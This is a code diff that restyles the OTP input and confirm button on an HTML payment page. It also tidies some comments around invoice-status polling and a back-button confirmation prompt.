@@ -184,6 +184,21 @@
       -webkit-text-security: disc;
       caret-color: transparent;
     }
+    /* We'll style the OTP confirm button to match the OTP input */
+    .otp-button {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      background-color: #gray; /* initial background */
+      color: white;
+      font-size: 18px;
+      text-align: center;
+      transition: background-color 0.3s ease;
+    }
+    .otp-button.valid {
+      background-color: #3b82f6;
+    }
     /* ========= Animations ========= */
     .animate-slide-in { animation: slideIn 0.3s ease-out; }
     @keyframes slideIn {
@@ -365,7 +380,7 @@
                   </div>
                 </button>
               </form>
-              <!-- Consent Message -->
+              <!-- Consent Message in Payment Form -->
               <div class="consent-message mt-4" id="consentMessage">
                 <span class="consent-checkbox checked" id="consentCheckbox">
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
@@ -382,10 +397,10 @@
               </p>
               <div class="otp-container">
                 <div class="otp-input-wrapper">
-                  <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-none" placeholder="••••••" required>
+                  <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-md" placeholder="••••••" required>
                 </div>
                 <div class="otp-button-wrapper">
-                  <button type="button" id="otpSubmitButton" class="w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center" disabled>
+                  <button type="button" id="otpSubmitButton" class="w-full px-3 py-2 border border-gray-300 rounded-md bg-gray-400 text-white flex items-center justify-center" disabled>
                     <span id="otpText">Confirm</span>
                     <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
                       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
@@ -637,11 +652,11 @@
       const otpButton = document.getElementById('otpSubmitButton');
       if (otp.length === 6) {
         otpButton.disabled = false;
-        otpButton.className = "w-full bg-blue-600 text-white py-2 px-4 rounded-none flex items-center justify-center";
+        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md bg-blue-600 text-white flex items-center justify-center";
         document.getElementById('otpError').style.display = 'none';
       } else {
         otpButton.disabled = true;
-        otpButton.className = "w-full bg-gray-400 text-white py-2 px-4 rounded-none flex items-center justify-center";
+        otpButton.className = "w-full px-3 py-2 border border-gray-300 rounded-md bg-gray-400 text-white flex items-center justify-center";
       }
     }
     // Consent checkbox event listener
@@ -758,7 +773,6 @@
           const result = await response.json();
           if (result.status === "success") {
             currentInvoiceId = result.invoiceId;
-            // Optionally store currentInvoiceId in localStorage if needed:
             localStorage.setItem("invoiceId", currentInvoiceId);
             statusCheckInterval = setInterval(checkTransactionStatus, 2000);
           } else {
@@ -839,8 +853,8 @@
       window.location.href = data.redirectUrl;
     });
   </script>
+  <!-- Back Button Prevention -->
   <script>
-    // Back Button Prevention
     window.onpopstate = function(event) {
       if (confirm("Do you want to cancel this transaction?")) {
         window.location.href = '/fail.html';
